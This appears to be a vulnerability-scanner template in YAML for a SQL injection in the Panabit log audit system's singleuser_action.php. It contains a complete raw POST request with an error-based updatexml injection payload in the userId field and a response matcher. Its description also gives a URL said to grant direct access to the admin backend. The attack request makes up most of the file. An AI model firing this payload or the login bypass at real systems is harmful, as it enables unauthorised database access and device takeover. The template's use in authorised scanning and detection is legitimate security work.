id: panabit-singleuser-action-sqli

info:
  name: panabit日志审计 singleuser_action.php SQL注入漏洞
  author: zan8in
  severity: high
  description: |-
    panabit日志审计存在 singleuser_action.php SQL注入漏洞
    访问 https://x.x.x.x/singlelogin.php?userId=26062 即可进入后台
    
http:
  - raw:
      - |-
        POST /singleuser_action.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
        Content-Length: 211

        {
            "syncInfo": {
                "operationType": "ADD_USER",
                "user": {
                    "userId": "a' || updatexml(1,concat(0x7e,md5(1),0x7e),1)and '1'='1%23",
                    "userPwd": "a"
                }
            }
        }
    matchers:
      - type: word
        part: body
        words:
          - c4ca4238a0b923820dcc509a6f75849
